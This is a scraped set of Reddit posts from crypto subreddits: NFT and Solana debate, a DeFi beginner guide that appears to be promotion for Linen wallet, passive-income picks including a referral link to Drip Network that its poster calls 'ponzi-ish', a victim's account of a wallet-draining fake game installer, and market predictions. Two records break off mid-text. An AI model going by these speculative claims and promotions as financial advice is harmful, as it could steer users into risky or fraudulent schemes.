"As a software engineer invested in crypto for several years, I don't get the recent NFT / metaverse hype?","when the nft hype started earlier last year, i assumed it was just non-tech-savvy people getting into the new cryptokitties. however, recently, even my tech-savvy software engineer friends and co-workers have been talking about nfts and the metaverse. i'd like to know if i'm misunderstanding nfts or if nft holders are misunderstanding nfts. for context: i'm a senior software engineer at one of the big 4, a significant portion of my net worth is in crypto, and i've spent several months writing crypto algo trading bots in 2017/18. from a technological standpoint, do the current nfts have any value, aside from selling to a greater fool? obviously, they're mostly just links to images, so they're still controlled by whoever's hosting the images. even if the images were embedded directly in the blockchain, i still don't see how they're useful because of the following reasons: 1. there's no uniqueness enforced: 2 people can mint the same image as nfts 2. nfts are useless for ip laws: in the eyes of the law, owning an nft doesn't mean you own whatever's in it. some nfts have legal writings attached, but as far as i can tell, that's pretty rare 3. with regards to the metaverse, it's up to whoever owns the metaverse implementation to decide whether to incorporate blockchain data. e.g. in facebook/apple/microsoft's metaverses, i think they'd prefer having centralized control of ownership of virtual goods, they'd likely ignore the current nfts let me know if i got any of this wrong! in my opinion, other ways to use nfts could still be valuable. one use-case that i'm very excited for is permanent ownership of video game assets. it's common for people to spend a lot of time or money in a video game, then they move on to another game. if my in-game currency, characters, and items could exist on the blockchain, then they could be transferred to another game or sold to other players. i think this would be especially useful for trading card games (e.g. mtg, yugioh, pokemon), where people can buy cards through a smart contract and load their cards into any client to play with other people. most clients would only allow cards minted by the official smart contract. through a dao, new cards can be added and banlists can be maintained. as far as i know, nothing like this exists yet, so the current nfts are pretty useless.",179,385,0.93,2022-01-16 02:28:16,web3,CryptoTechnology,linksku,False,270.7

Solana's endgame: becoming an Ethereum rollup,"there's a lot of misinformation and animosity in the space, people love to pit solana as an ""ethereum killer"". in this post, i'll make the argument that solana and ethereum are better together - each working to the best of their strengths. as the blockchain industry, we have to come together, leave our egos aside and build what is actually the best engineering solution for mass adoption. and i believe this is solana being a zkrollup on ethereum. first, let's get some misconceptions out of the way. edit: i'm seeing a lot of comments confusing what i'm saying for the old ethereum 2.0 model. please read this next paragraph. all of this is not true anymore! i'll emphasize again. i'd also regret mentioning ethereum in the title. this is actually not about ethereum - it's about zkrollups. a zkrollup can leverage whatever offers the highest security, decentralization, and data availability. a zkrollup is fully composable. these are not shards! currently, ethereum is best positioned with the rollup-centric roadmap (more below) but it can also be another solution. ethereum 2.0 does not exist. i repeat - ethereum 2.0 is not a thing. this was certainly the case in 2019, but in 2020, ethereum pivoted to a rollup-centric roadmap. what this means is ethereum l1 is transforming into a settlement layer for rollups. ethereum is no longer focused on being a smart contract platform, but rather, a platform to build smart contract platforms on top of. this starts with the merge, which will merge the execution layer (previously eth1) and consensus layer (previously eth2), and continue with the release of data shards. to put it simply: users will rollups, rollups will settle on ethereum. what are rollups? rollups are simply blockchains that are laser focused at offering the highest throughput possible with instant transaction confirmations, while leaving the hard work of security and data availability to a different chain that's better at it. this way, it can achieve upto 10x-100x more throughput possible than any l1, by using clever compression techniques. there are several rollups live today, with more rolling out over the next few years. so, what does solana as a zkrollup look like? actually, very similar to zksync 2.0, which is currently in testnet, with mainnet release due late this year or early next year. like solana, zksync 2.0 leverages llvm, allows programming in native rust, and is designed to offer 100,000+ tps. however, zksync 2.0 has two key advantages over solana: \- instead of thousands of validators and thousands of non-validating nodes, zksync 2.0 can be more secure and decentralized than solana while running one sequencer. ok - you need more than one, to cover liveness and censorship resistance risks, but a handful sequencers and provers will offer bulletproof security. this will enable zksync 2.0 to scale farther than any l1 ever could. \- this is done by using advanced zero-knowledge proofs. a zkrollup can commit to whatever the most secure and decentralized l1 is at the time (currently, ethereum) and the zk proof ensures validity. what this means is that over the long term, by leveraging ethereum data shards, zkrollups can scale up to millions of tps, while continuing to be highly secure and decentralized, with being verifiable on consumer pcs. solana can scale up to 50,000 tps, according to the description in this subreddit. let's take this to the next level! by the way, it's very important to note that a zkrollup maintains full composability even across multiple data shards. so, why can ethereum data shards help scale solana to millions of tps, and why can't it do it all by itself? the answer is simple: ethereum is targeting 1 million validators long term, and the more validators there are, the more data shards can be deployed. yes, this is the opposite of the blockchain trilemma. now, i'm sure you have seen some criticisms about binance running 10,000 validators - and this is true. however, the beacon chain is at a very early stage, and actually, technically it doesn't matter. what matters is that 1 million validators enables over 1,000 data shards for insane data availability. next, zkrollups are highly efficient, and through advanced compression and aggregation techniques, it requires 1/10th to 1/100th the data availability a traditional l1 would. combine highly efficient use of data availability with massive data availability, and you have the holy grail of blockchain scalability. the incredible thing about zk chains is that you don't even have to exclusively use ethereum for data availability! you can use both ethereum and other data availability solutions like solana itself. indeed, they can be used concurrently, while still saying composable. imagine ethereum and solana in one chain, fully composable. that's the magic of zk tech! also, if a different chain offers better security than ethereum - just migrate there or add that as an option for users. in short, if solana becomes a zkrollup: \- instant transaction confirmations. \- scale up to millions of tps long term. \- while still offering the highest possible security and decentralization in the industry, and being verifiable on a consumer pc. \- offer users the choice for varying spectrum between cost and security. \- remain competitive with future zkrollups like starknet and zksync 2.0 which will outscale all l1s and offer higher security and decentralization. it's a no-brainer! finally, the caveats: \- this vision will take years to roll out, and it's a highly advanced, complex system which will need years to prove itself. but it's certainly time for solana to start looking closely at zksync 2.0, starknet, polygon hermez and other zkrollups and examining how things progress. another caveat after thinking about it is that finality is not instant, but because zk proofs are permanent so it's practically the same as the instant confirmation.",319,172,0.95,2021-08-24 14:05:41,web3,solana,Liberosist,False,269.7

What would you do in this position? ,"i invested around £22k (which was all the money i had saved) in crypto in 2021 just before everything crashed. in the bear market, this went down to 6.6k at its very lowest. for someone that has always worked in retail where i have never earned more than 1.5k a month, this was a huge loss which i could clearly not afford. i decided i would either hold this all the way down to 0 or try to make my money back somehow. overtime and with the current bull market, my portfolio recovered to around 13k and a couple months ago, i decided to start trading meme coins on the solana network. my portfolio today is worth around £83k, all of which i have converted to a stable coin. i went from feeling stupid to getting started in crypto to being thankful for it, all while still folding clothes in a retail store. i would love to get some advice on what to do next. i feel that the smart thing to do is sell the majority of it but apart of me also wants to go all in on solana as i feel the best of the bull market is yet to come towards the end of the year and running into 2025. what would you do in this position?",116,475,0.93,2024-06-20 10:03:16,web3,solana,Ibs-K-95,False,268.90000000000003

A DeFi Guide for Beginners: From 0 to 15% Yield in Under 40 Minutes,"i've been in this subreddit for a while now and i've seen many times people asking for some guidance on how to get started with defi. i still remember how surprised i was when i heard of defi for the first time. i’d held bitcoin and ethereum for some time, but i hadn’t fully realized how much more i could do with crypto—so i really hope this guide will make things easier for you. i remember that the more i learned about decentralized finance, the more confused i was. not only was the theory behind it complex, but i then needed to learn how to use each app and understand what was safe and unsafe. it was a difficult process, but don’t worry. this won’t happen to you because this is exactly the guide i wish i’d read when i was getting started with defi. indeed, we won’t stop just at the theory, but we’ll see how to use all the tools and apps needed. **note:** i assume that you are already familiar with crypto and know what a blockchain is and how popular cryptocurrencies like bitcoin and ethereum work. if not, you might want to learn all of that before reading this article. if you are already familiar with crypto, keep reading to learn how to unlock the true power of your assets. **what you will learn in this guide:** * what is defi? * what are stablecoins? * earn yield with defi: lending * understanding crypto borrowing * understanding smart contracts * what is a blockchain app? * setting up your crypto wallet * what is a crypto wallet and why do you need one? * which crypto wallet to choose * download and set up the wallet * funding your wallet * how to use a defi app * conclusion and further reading ## what is defi? before diving into the practical things, it’s important to understand the basics that power everything we are going to do in defi. so let’s start by understanding what defi is and how it differs from traditional finance. there are many different ways we use our money in the course of our life—buying goods, exchanging our local currency for foreign ones, getting a loan, investing in a company, and more. all these transactions are facilitated by financial corporations, like banks, controlled and owned by a small group of shareholders. since anything we do with our money is controlled by these institutions, this system is known as centralized finance (cefi) or traditional finance (tradfi). this is the financial system we are all familiar with, in which third parties control all our transactions while charging a fee for their services. for example, whenever you buy a cup of coffee by card, you and the merchant are not the only parties involved in the transaction. your bank, the shop’s bank, and a financial network like visa or mastercard are typically involved too. and each party charges a fee for its service. decentralized finance (defi) offers us all the same financial instruments and opportunities of traditional finance (like buying goods, or lending money for a yield) without any intermediary like banks or brokerage firms as they are replaced by blockchain and smart contracts. using defi applications, you will be able to lend or borrow crypto from peers, trade crypto assets without any centralized entity, earn high interest, and much more. in this guide, we will mainly focus on how to use defi to earn a high and safe yield on usdc. &#x200b; https://preview.redd.it/zpelunsyawr81.png?width=1024&format=png&auto=webp&s=dbf029dace968672b22e95f55cc412df05e1c6eb ## what are stablecoins? since the first bitcoin block was mined, volatility has been one of the main problems for the broader adoption of crypto. popular cryptos like btc or eth often reach dizzying heights one day and plummet to gut-wrenching depths the next. needless to say, the huge volatility would have never allowed for the mainstream adoption of blockchain. that’s where stablecoins come in. stablecoins are a type of cryptocurrency whose value doesn’t fluctuate, thus the name “stable.” they are stable because their value is based on and pegged to stable real-world assets. usually, stablecoins are backed by currency like the u.s. dollar. those are also known as fiat-collateralized stablecoins because they are backed by money issued by governments. this includes currencies like the usd, eur, or gbp. as long as the economy of the currency’s country remains stable, so will fiat-backed stablecoins. fiat-backed stablecoins are collateralized 1:1. that means for every stablecoin in circulation, a single unit of currency ($1) is kept in a bank account to back it up. if you want to trade in your stablecoin for cash, you will receive the equivalent directly from the issuer, such as circle for the usdc stablecoin, or purchase it on a crypto exchange like coinbase. the stablecoins corresponding to the amount you retrieved will be taken out of circulation if you redeem them with the issuer. ## earn yield with defi: lending exactly as you can do in traditional finance, one of the main ways to earn yield in defi is to lend your funds to someone for interest. so how does that work? how do you lend your funds to someone? is it safe? how can you be sure that you’ll get your money back? if you had to lend $1,000 to a friend, you could agree to give him the money if he will pay it back after one year with a 10% yield. so your friend would give you back $1,100 after one year, and you would have realized a nice profit on your funds. however, if you give the same $1,000 to a complete stranger on the internet, chances are you would never see your money again. that’s why if someone wants to borrow funds via defi, they must give collateral in exchange. for example, if i want to borrow $1,000 worth of usdc, i have to give $2,000 worth of eth as collateral. this way, the other party knows that i won’t run away with their money. i know what you are thinking: “why the hell would someone give $2,000 worth of eth to get back $1,000 of usdc? can’t they just sell $1,000 worth of eth to get the money they need?” well, this is exactly what i thought the first time i heard of crypto lending and borrowing, but don’t worry. you’ll understand everything in a minute. ## understanding crypto borrowing at first glance, crypto borrowing might not seem that reasonable. however, there are many reasons for a borrower to use eth as collateral to borrow crypto instead of selling it. * **liquidity needs:** let’s say i am a long-term holder of btc and eth and i have most of my net worth in crypto while holding very few fiat currencies like the u.s. dollar to pay for day-to-day expenses. however, an unforeseen event like a car accident happens and i need a great amount of usd to repair my car or buy a new one. i could sell $20,000 worth of btc to satisfy my liquidity needs and buy it back after a year. however, if btc appreciates in value by 30% in that year, i would incur a 30% loss. instead of selling, i can use my btc as collateral and borrow the amount of usd i need while paying a 5% annual fee. this way, i can be exposed to btc capital appreciation while still having the liquidity i need to pay the unforeseen expense. * **investment leverage:** another popular reason to borrow crypto is to have some investment leverage. for example, let’s say that i hold $20,000 worth of btc. if bitcoin appreciates by 30% in one year, i earn $6,000. however, if i use $20,000 btc as collateral to borrow $10,000 usdc, i can then use that to buy another $10,000 worth of btc. if bitcoin appreciates by 30% in one year, i earn $9,000 and, after paying $500 worth of interest, i have a net gain of $8,500 instead of just $6,000. this is the same concept of using leverage as you would see in traditional finance. however, instead of getting the leverage via a broker, i get it via a decentralized liquidity protocol. ## understanding smart contracts now that you know why someone would borrow stablecoins for collateral, there are some other pieces to add to the puzzle. if the borrower gives you $2,000 in eth as collateral to borrow $1,000 in usdc, who’s to stop you from running away and selling it on the market? and what happens if you receive eth, but then its value drops significantly? if the transactions happened just between you (the lender) and the borrower, the only way to make it work would be to trust each other. however, this is not the premise of blockchains and defi. instead, we need a trustless system where things like this can work without needing trust and without any centralized institutions like banks. this is where smart contracts come in. a smart contract is a piece of code on the blockchain that runs when specific conditions are met. when you want to lend cryptos for an interest, instead of interacting directly with the borrower, the two of you will use a smart contract that manages the transaction. this is how it works: 1. you (the lender) deposit $1,000 worth of usdc into the smart contract using a blockchain application (we’ll see later how to do this). 2. the borrower deposits $2,000 worth of eth as collateral into the smart contract. 3. the smart contract gives the borrower $1,000 worth of usdc while locking the eth deposit. this way, you cannot run away with the borrower’s eth. 4. when the borrower deposits $1,000 worth of usdc back in the smart contract, the code will give him back the eth deposited minus the interest needed to pay you. 5. you receive the $1,000 deposited plus any interest. 6. if, in the meantime, the value of eth drops below a certain threshold, the smart contract will automatically sell eth and pay you back. this way, your funds are protected against any market drop thanks to the code that runs automatically. https://preview.redd.it/b5dhntp0bwr81.png?width=1156&format=png&auto=webp&s=49c4ee8508817db195330e28d358f8a1638c0be2 now that you have learned the ins and out of crypto lending and borrowing and how smart contracts make all of this possible, you need to understand how to actually use a blockchain app and a crypto wallet to start earning your first yield with defi. ## what is a blockchain app? as promised at the beginning of the guide, this is not an average theoretical guide. at the end of it, you will be able to actually start earning yield with defi by using all the tools and apps needed. that’s why it’s important to understand what a blockchain app is and how to use it. a blockchain application (also known as a decentralized application, or dapp) is a digital program just like any other app we use in our everyday lives. there are blockchain applications for gaming, investing, social media, and music that you can use via your browser or smartphone. the main difference from other apps is that instead of running on a centralized server owned by a company, decentralized applications run on a blockchain like ethereum or polygon. that’s why dapps are not subject to the control of any single authority. for example, anyone can develop a social media platform like instagram and run it on a blockchain to allow any user to publish posts or comments. once published, no one—including the dapp developers—can modify or delete any posts. as already mentioned, there are blockchain applications for many different use cases including gaming, social media, and music. the ones that interest us the most are decentralized applications for lending and borrowing, also known as *liquidity protocols.* so how do we use these apps? how do we add our funds to a liquidity protocol? to do that, we need a cryptocurrency wallet that can connect to blockchain applications. indeed, while crypto exchanges like coinbase are the most popular options to start your crypto journey, they don’t allow you to get the most out of your crypto because you cannot connect them to blockchain applications. that’s why we need a non-custodial cryptocurrency wallet. ## setting up your crypto wallet ## what is a crypto wallet and why do you need one? if you’re not completely new to crypto, you’ve probably already used a cryptocurrency exchange like coinbase or crypto.com to buy and store crypto assets like bitcoin or ethereum. while they are a perfect way to get started and buy your first cryptos, they don’t allow you to fully explore the opportunities coming from defi and web3. furthermore, when you store cryptos via an exchange, you don’t fully own them because they control your private key. as the saying goes, “not your keys, not your cryptos.” on the other hand, with a non-custodial wallet, only you have access to your private key, and no one can control your funds. furthermore, a self-custody wallet is also required to use blockchain applications and participate in defi. ## which crypto wallet to choose there are different types of cryptocurrency wallets available on the market, with the main distinction being between hardware wallets (also known as cold wallets because they are not connected to the internet) and software wallets (also known as hot wallets), which are mobile or desktop apps. hardware wallets are physical devices similar to a usb considered to be more secure than hot wallets. however, they are more difficult to use and are not recommended for beginners. on the other hand, hot wallets are easier to use because they are simple desktop or mobile applications. however, they are considered to be less secure because they are connected to the internet, and thus it can be easier for an attacker to access your private key. the main problem with both types of wallets is that if you lose, or someone steals, your seed phrase (which is a 12 to 24-word password to access and recover your wallet), you’ve lost your funds forever. a better alternative is to use a smart wallet like linen wallet. smart wallets are a new type of non-custodial wallet that offers advanced security while also being much easier to use. as such, they are the best option to get started with defi and web3. so how can they be so secure while also being much easier to use? let’s get deeper: * **multi-keys:** using a smart contract, linen wallet is secured using three keys, not just one like most non-custodial wallets. two out of the three keys are required to make a transaction. as such, even if someone steals one key, they won’t be able to access your funds. other non-custodial wallets only have one key, and if someone gets access to it, all your funds are lost forever. * **easy wallet recovery:** one of the main problems with other non-custodial wallets is that you have to store your private key yourself on a piece of paper or metal card. as such, the risk of losing it is very high. instead, linen wallet makes it easy to manage your private keys—one key is stored in your cloud, one in your mobile device, and one in linen’s secure server infrastructure, so you can seamlessly recover your wallet using your cloud drive, email, and phone number. ## download and set up linen wallet you now need to download and set up your crypto wallet to connect to blockchain apps. [click here](https://apple.co/3wnnlr0) to open the linen wallet page on the app store. once there, click on “get” to download the app. once downloaded, follow the instructions in the following video to set up your wallet. it will take less than a minute: https://reddit.com/link/txk7m4/video/gaz3q084bwr81/player ## funding the wallet everything is set up, and the only thing missing is the crypto that we’re going to invest in with defi. so we need to deposit some funds to our linen wallet. there are two ways to do that: ## in-app purchase by card you can purchase usdc directly in the app. just click on the “buy crypto” button in the “wallet” section of the app, select the crypto to buy (in our case, usdc on the polygon network), and add your card details. the only drawback is that simplex requires a 5% fee with a minimum fee of $10 (this fee doesn’t go to linen but to the payment processor. we don’t take any fee for deposits). ## deposit funds via an exchange if you already have some funds stored in an exchange, you can send them to linen wallet. to do that, follow these instructions: * **get your linen wallet address**—your blockchain address is like an email that can be used to send you money. you will use it when withdrawing funds from an exchange to send them to your linen wallet. you can find your address in the “profile” section of the app, as shown below: https://preview.redd.it/zmvn21j6bwr81.png?width=429&format=png&auto=webp&s=f84aa84e22830fd78bb63dc6a1e5bde65c3ec3cc * **important:** as you can see, the address we’ve just copied is on the polygon network. for this reason, it is important that the exchange you are using supports withdrawal to the polygon network. if you use this address to withdraw but the exchange only supports ethereum, you will send your funds to someone else. to make a practical example, let’s take the email address “[myname@gmail.com](mailto:myname@gmail.com).” you can imagine your address as the unique address that identifies you on a certain blockchain (“myname” would be your address), while the second part of the email is the blockchain you are using (gmail.com). if you try to send an email to “[myname@yahoo.com](mailto:myname@yahoo.com),” it won’t be delivered to the person intended. the same applies to blockchain addresses. in this case, polygon is the network to use and your address is your identifier on the polygon network.**note:** if you have assets on the ethereum network, you can follow [our guide](https://support.linen.app/en/articles/5977574-how-to-move-assets-from-ethereum-to-linen-wallet-on-polygon) on how to move them to your linen wallet on polygon. * **send usdc to linen wallet:** after copying your linen wallet address, you can withdraw funds from the exchange. you can see what the process looks like on crypto.com in the screenshot below. as you can see, crypto.com lets you select the network from which to withdraw usdc. if the exchange you are using doesn’t let you choose the network, do not withdraw your funds. https://preview.redd.it/gslatyg8bwr81.png?width=300&format=png&auto=webp&s=aaefd10f6f68a020fe4425b643021cafabdda86a before we continue, please let me remind you that this is not financial advice and you should do your own research for any project or app you use. ## how to use a defi app so now that we’ve understood all the basic theory behind defi and that we know how to set up and fund our crypto wallet, it’s time to start earning a yield on our stablecoins. you already know what a blockchain app is and how it works on the back-end. let’s now see what blockchain app to use and how it actually works. in this guide, we’re going to use aave, which is probably the most popular and most secure defi application. by the way, i’m not affiliated in any way with aave and i’m using it for this guide just because it’s actually one of the apps i use for my own defi investment. you can find a detailed guide on how to use the app [here](https://support.linen.app/en/articles/5972564-how-to-connect-to-blockchain-apps-with-linen-wallet). ## conclusion and further reading you now understand all the basic theory behind defi. of course, there is still much more to learn and there are many different ways to earn a higher yield—liquidity pools, impermanent loss, yield farming, and auto compounding are just some of the many things you can go deeper into. however, you already know more than 90% of crypto enthusiasts. if i receive great feedback from this first defi guide, i will gladly publish a new episode of this defi course so make sure to subscribe so as not to miss it. if you have any questions or doubts, feel free to ask them in the comments section below. i’m always happy to help.",349,103,0.98,2022-04-06 07:42:30,web3,defi,Manuel_Ble,False,260.40000000000003

What are your favorite passive income holdings?,"with the markets going further down south, i guess everyone appreciates some nice risk diversification. passive income streams provide some extra cash during periods with either negative or no major price movement at all. this can be archieved in many various ways with the current defi landscape. feel free to shill your most favorite ways of earning passive income trough crypto holdings. would be nice to get some short descriptions as well as a personal risk score from 0-10 - with 0 being tradfi bank deposit and 10 being ultimate degen territory. i'll start: 1. [**hundred finance**](https://hundred.finance/) \- i'm currently earning 80% apr on my mim stables. rewards are paid in their native $hnd token, which is obviously object to price movements. one could however manually compound the mim holding each day. the high apr is reached by boosting the rewards via $hnd token staking. however it's a fairly small amount which is necessary to stake, in order to archieve the highest possible boosting. **risk score: 5** 2. [**beefy finance**](https://www.beefy.finance/) **-** i'm in various vaults on beefy finance. many are quite lucrative, even though impermanent loss might hit you in one or the other situations. there are also nice stable coin pairs and single side staking options available. this can reach from fairly safe to absolute degen. **risk score: 4-10** 3. [**platypus finance**](https://app.platypus.finance/) **-** similar to hundred finance, though the maximum boosted aprs were initially much higher. however with the recent market dip, they seem to have drastically decreased the aprs. also the ptp token's price, which is used to pay the rewards, suffered heavily during the dip. archieving of highly boosted aprs does require some more effort and commitment to their token than with hundred finance as well. **risk score: 5** 4. [**drip network**](https://drip.community/) **-** i'm still a bit torn on this one as it seems a bit ponzi-ish to me. i could not yet figure out any other income streams into the protocols treasury, besides new participants. i invested a small amount anyway to see where this is going: your deposit as well as the rewards are in their native $drip token. the most critical part to understand is, that your initial deposit is locked in the protocol forever and can never be withdrawn. free to withdraw however are the rewards. the protocol promises a stable apr of 365%. you can always chose to either withdraw your rewards or to compound them. the latter option locks up your rewards forever with your intial investment. however you'd be earning a little bit more the next day. obviously everything comes down to community growth and price appreciation of the $drip token. it is worth mentioning that the $drip token's price held up amazingly well during the latest market dip. it actually just reached a new ath today. there could be amazing potential here. should you want to try it, feel free to use my [referral link](https://drip.community/faucet?buddy=0xd17103893860e1f6b1910fdcf92cd42d696e80f5). it buys me a beer :-) **risk score: 7** &#x200b; **tl;dr:** shill me your most favorite holdings for passive income with crypto!",133,406,0.97,2022-01-23 14:58:47,web3,defi,Fine-Rib,False,251.89999999999998

I don't know what to do anymore.,"i am genuinely sorry for this rant. but i have no one to talk to or nowhere to go. i was looking for jobs in crypto project, it's been an year since i have been looking for jobs irl for so long without any success. i thought i might as well try working in an nft project as a moderator. so i joined a crypto-job server online and saw some guy saying they need an in-game moderator in this project called @\_partyroyale on x. i texted them and they sent me an invite to the server and a link to a game. i downloaded the game in my laptop. while installation, the game got stuck at 96%. it looked sus so i uninstalled it immediately. when i woke up, all my all my sol and eth was gone.

Which current L1/L2 projects would still survive if a new L1 that solves all of the problems with current tech appears in the future?,"majority of the current l1/l2 solutions solve only some of the problems. either they have a hard limit on scaling or more centralised due to high costs of running a node or break atomic composability with sharding. in short none of them truly solve the trilemma without breaking atomic composability. composability is what makes the smart contracts truly powerful. now imagine a project that is working on solving all these problems and can scale without any limit, is truly decentralised where you can run a node on pi3, secure with some inherent mechanisms to develop safe dapps and easy to build on and supports atomic composability on a sharded network. assuming this project is “the blockchain”, what would happen to existing projects that are state of the art now but are only solving some of the problems?",73,483,0.95,2021-12-18 13:58:45,web3,CryptoTechnology,TradeRaptor,False,246.5

Here are some reasons why you shouldn't panic,"will keep it as short as possible * solana mainnet is ""beta"" meaning it is in active development and bugs are more likely to happen when a software is in its beta phase. big investors won't give up on a project that didn't do anything out of the normal * when someone tells you ""they restarted the network, it is centralized"" the response is easy: ""the community reached a consensus to restart the network for a software update"". ethereum applied the london hard fork against its miners community well. who is more likely to be centrlized? (i hold both eth and sol, and this comparison is just for the sake of the argument) * solana (beta software) halted when it reached a 400k transactions per second. a performance that's not even achievable for ethereum or cardano whose maxis try to scare you now. * while ethereum in comparison is a much more mature blockchain/software than solana, ethereum just had a blockchain fork (much worse issue from security perspective). and it is still here, and making profit and new projects! * cardano smart contract has been in research and being ""peer reviewed"" even before people started developing solana and it still doesn't dream of half of solana performance. add to that, its dev community struggling to learn how to develop on it. just saying",228,234,0.81,2021-09-14 16:55:05,web3,solana,Ahmed_Ali_A,False,238.49999999999997

"My 22' DeFi Predictions: It's NOT the year of GameFi, the next Alt L1's, the rise of Smart Privacy, and more","i wanted to share some of my predictions regarding the meta game and narratives this year in the defi space. i want to make it clear...it's hard to give accurate predictions because defi innovates 100x faster than the real world. think about the beginning of 2021, no one could've seen the innovations that defi 2.0 brought. and the biggest defi projects of 2022 probably haven't even entered the minds of the founders yet! regardless, i'm going to give some predictions. writing them down and revisiting which ones you got right or wrong, will make you a better investor in the long run. ### **1. the market will reach all-time highs** **** ""*ah man, i knew i should've taken more profits! why did i invest in 10 different ohm forks!*"" we're in a dip and everyone's scared. the fed can't seem to make up their minds about the interest rates. expect to see a ton of volatility in the upcoming months. we could see the fed raising interest rates temporarily, but they've dug themselves too deep in a hole. jerome powell's in charge and he won't be able to keep his hands away from the money printer too long. i do not see us entering a crypto winter like we saw in 2018. these are going to be short bear markets like we saw in may. retail does seem to be tapped out. there aren't anymore stimulus checks coming in, and inflation's eating away at people's disposable income. expect more inflow to come from institutions. more mainstream companies will add bitcoin to their balance sheets. a btc spot etf could come this year and become a game changer. ### **2. the alt layer 1 rotation continues** **** 2021 saw the rise of solana, luna, and avax. those coins will keep growing, but they're already near the top 10 for market cap. investors will be flocking towards other layer 1's that offer better growth potential. some that come to mind are ftm, near, harmony one, and cosmos (atom). for higher risk and reward, you can look at the protocols being built on top of these. examples: aurora (near), octopus (near), moonriver (kusama / cosmos). keep your eyes on the layer 2 solutions on eth. we saw the growth of matic, immutable x, loopring, and arbitrum this year. use [l2beat.com](https://l2beat.com/) to see the tvl growth of people onboarding. one play that i'm keeping a close eye on is **metis andromeda**. it has been gaining a ton of traction and it's assumed that team is close to vitalik buterin. *the ceo is vitalik's childhood friend, and vitalik's mom is on the team...seriously*) ### **3. the rise of smart privacy** privacy is a human right. just because i want financial privacy doesn't mean i'm walter white. monero exists, but you can't do anything with it. 2022 could becoming the breakout year for combining smart contracts + privacy. secret network ($scrt) is a layer 1 where privacy is default. imagine your eth transactions being private with zk-snark technology. that's railgun ($rail). ### **4. this will not be the breakout year of gamefi** everyone’s saying that 2022 will be the year of gamefi. i don't agree. games should be fun. there hasn't been a single game out there i've seen that is fun first. triple a game developers are coming. most of them have made the decision to get into gamefi this year after seeing the explosion of axie infinity. from there you have to give them a few years to develop the game and understand tokenomics. the exception of course is defikingdoms. everyone feels that it's too late, but it **just** entered the top 100. it has the best tokenomics in crypto right now, and they're only on one out of their planned five chains. in the meantime, some of the smaller games will gain traction this year such as thetan arena, crypto raiders, illuvium, and more. gamefi will have its party around 2023+. ### **5. algorithmic stable coins takeover** stablecoins are the backbone of defi. the us government has already said that they're looking to regulate stablecoins. that puts usdt and usdc in danger, and we'll see the rise of more algorithmic stable coins. i'm sure you're familiar with ust (terra luna) and mim (abracadabra) pay close attention to frax finance. they are a hybrid coin that's partly collateralized, and partly algorithmic base. and they're making big brain moves. ### **6. the curve wars continue** if you're not familiar with the curve wars, here's a great introduction: [part 1](https://theknower.substack.com/p/the-mythos-of-curve-finance) and [part 2](https://theknower.substack.com/p/the-curve-wars-rage-on). **tdlr:** *stablecoins power the defi ecosystem. curve controls most of the liquidity in stablecoins. if you want your stablecoin to have liquidity and succeed, you need to direct rewards towards your coin. the crv token gives voting power. convex finance is a layer built on crv that controls over 50% of the voting power.* the curve wars have intensified with the release of \[redacted\] cartel and the $btrfly token. as an official fork of olympusdao, they're using the bonding mechanism to lock up as much crv tokens as possible. another key player to watch out for is **tokemak (**$toke**)**. we will see other protocols and interesting mechanisms to gain more power in the curve wars. keep a close eye on this narrative. ### 7. options trading explodes everyone's familiar with the stock market, but not too many people know about options trading. it's set to become bigger than the stock market soon. what are options? you pay an upfront cost now to have the **option** to buy or sell an asset later (at a price determined now). do you remember the craziness surrounding gamestop and wallstreetbets last year? that was all done through options trading. now what if you could do this with crypto assets? what if you could do calls and puts on the price of btc, eth, and other coins? they're here and they're going to keep growing. the smart money's on ribbon finance and dopex. that's it. what are some of your predictions? by the way, i just started a newsletter this week. i got annoyed that most of defi media is too focused on ethereum, and i wanted to cover other amazing projects being built out on ftm, terra, avax, and more. basically, an easy way to keep up with defi projects. if this is something you're

I know this is gonna get major down votes but we need to talk about MSTR . ..just hear me out,"first let me start off by saying i own shitloads of crypto mostly btc and some eth and xmr plus dabble in a few interesting little things here and there when the utility is good . when saylor says he gets a btc yield , that yield is just coming from more investors piling in at a premium to nav unjustified by dcf from the actual business. this is much closer to a ponzi scheme than any of the stuff people normally like to call ponzi schemes surrounding crypto. now this doesn't mean it is going to collapse from margin calls or him owing money from their debt which is actually on mind bogglingly favorable terms . but when the current premium goes away , the ability of saylor to keep buying shitloads of btc goes away and the ability to get ""btc yield"" goes away. i understand many people here already understand all of this... however, i read lots of comments , probably the majority in multiple subs where people that do not understand any if this are investing heavily in this ""infinite money glitch"" that isnt infinite !. i think that's basically all i have to say. on my previous accounts i called many different things like this and laid out details about problems and i get yelled out of the room each time and down voted to oblivion by overconfident incompetent people who later lose their asses exactly how i said was highly probable. this includes a number of exchanges and rug pulls and ponzis . anyways i support everyone doing what they want . i just want to break the weird herd mentality a bit so some moon boiz can sober up.",155,326,0.67,2024-11-18 14:47:12,web3,CryptoCurrency,Needsupgrade,False,230.1

So many temptations to FOMO in a market like this.  So many people talking about moves you could make.  Here's a reminder to take your eyes off the charts and HODL.,"with the recent surge to $90k and counting, it's clear the bull is back, and social media is starting to buzz with bull market hype, shills, and fud. for those of us who have seen a cycle through in the past, this is nothing new. we all know it's only going to get more intense as crypto gets on the news, grandpa asks about bitcoin at thanksgiving, and millions of newbie investors flood the space looking to fomo their life savings into whatever the latest meme coin is. the crypto space will soon be completely euphoric. it will seem like no matter what you buy, you can't lose. people will make stupid amounts of money by placing risky bets on alts and meme coins. you might feel jealous and be tempted to sell your btc to buy dog farts. i won't tell you what to do with your money, but i will tell you that while dog farts can indeed produce epic profits, typically those bets are placed too late in the game. here's a cautionary reminder to avoid the hype. it may seem tempting to make a big move; buying, or selling. don't fall for fomo. if you can handle the risk of buying halfway into a bull run, there's nothing wrong with continuing your dca. and if you don't want to risk going further, there's nothing wrong with starting to take profits. but for the majority of us, assuming you invested your lot sometime in the last year and a half... hold on!",245,182,0.92,2024-11-15 18:46:32,web3,CryptoCurrency,throwaway92715,False,229.0

